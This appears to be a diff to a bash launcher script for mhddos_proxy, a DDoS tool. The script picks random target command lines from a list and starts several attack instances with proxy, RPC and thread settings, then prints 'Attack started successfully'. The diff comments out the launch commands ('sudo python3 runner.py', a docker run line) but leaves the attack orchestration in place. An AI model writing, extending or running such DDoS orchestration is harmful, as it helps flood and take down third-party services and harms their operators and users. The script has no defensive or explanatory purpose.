@@ -87,7 +87,7 @@ do
    echo -e "\nRandom number(s): " $random_numbers "\n"
       
    # Launch multiple mhddos_proxy instances with different targets.
-   """for i in $random_numbers
+   for i in $random_numbers
    do
             echo -e "\n I = $i"
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
@@ -97,9 +97,9 @@ do
             echo -e "\nfull cmd:\n"
             echo "$cmd_line $proxy_interval $rpc $threads $debug"
             
-            cd ~/mhddos_proxy
+            #cd ~/mhddos_proxy
             #sudo docker run -d -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
-            sudo python3 runner.py $cmd_line $proxy_interval $rpc $threads &debug&
+            #sudo python3 runner.py $cmd_line $proxy_interval $rpc $threads &debug&
             echo -e "\n\033[42mAttack started successfully\033[0m\n"
    done"""
    echo -e "\033[0;34m#####################################\033[0;0m\n"
